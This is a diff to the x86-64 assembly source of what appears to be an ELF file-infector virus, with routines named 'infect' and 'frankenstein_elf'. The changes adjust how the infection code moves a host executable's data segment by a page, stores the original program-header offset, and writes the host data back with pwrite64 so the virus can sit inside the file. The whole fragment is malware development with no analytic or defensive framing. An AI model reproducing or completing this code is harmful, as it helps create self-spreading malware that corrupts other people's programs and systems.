@@ -302,6 +302,8 @@ data_offset_new_padding: dd 0
 data_offset_original: dd 0
 data_offset_padding_size: dd 0
 
+;DATA_OFFSET_HOST equ data_offset_original
+DATA_OFFSET_HOST: dq 0
 ;padding2data_segment equ	data_offset_new_padding-data_offset_original
 
 vxhostentry: dq 0
@@ -783,6 +785,8 @@ infect:
 				.mod_phdr_data_segment:			
 					mov r11d, dword [r13 + r12 + elf_phdr.p_offset]
 					mov dword [data_offset_original],  r11d
+					lea r10, [r13 + r12 + elf_phdr.p_offset]
+					mov [DATA_OFFSET_HOST], r10
 					add dword [r13 + r12 + elf_phdr.p_offset], PAGESIZE
 					mov dword [data_offset_new_padding],  r11d
 					;sub r11d, dword [data_offset_original]
@@ -935,7 +939,7 @@ frankenstein_elf:
 		syscall
 
 
-		push rsi
+		;push rsi
 	;.lseek_end_phdrs:
 		;mov rdi, r9						; prob unnecessary since this should still be the val in rdi
 		;mov rsi, rdx					;(offset in rsi =hostentryoffset)
@@ -998,14 +1002,16 @@ frankenstein_elf:
 		mov rdx, [r14 + filestat.st_size]
 		sub edx, dword [data_offset_original]
 
-		pop rsi		
+		;pop rsi		
 ;		mov rdi, r9						; prob unnecessary since this should still be the val in rdi
-		;mov rsi, r13
-		;add esi, data_offset_original
-		;add esi, dword [data_offset_original]
+		;add rsi, data_offset_original
+		;add r13, data_offset_original
+		;add r13d, dword [data_offset_original]
+		mov rsi, [DATA_OFFSET_HOST]
+			
 		;mov r11, r13
-		;add r11, data_offset_original
-		;mov rsi, r11
+		;add r11d, data_offset_original
+		;lea rsi, [r11]
 		mov r10d, dword [data_offset_new_padding]
 		mov rax, SYS_PWRITE64
 		syscall
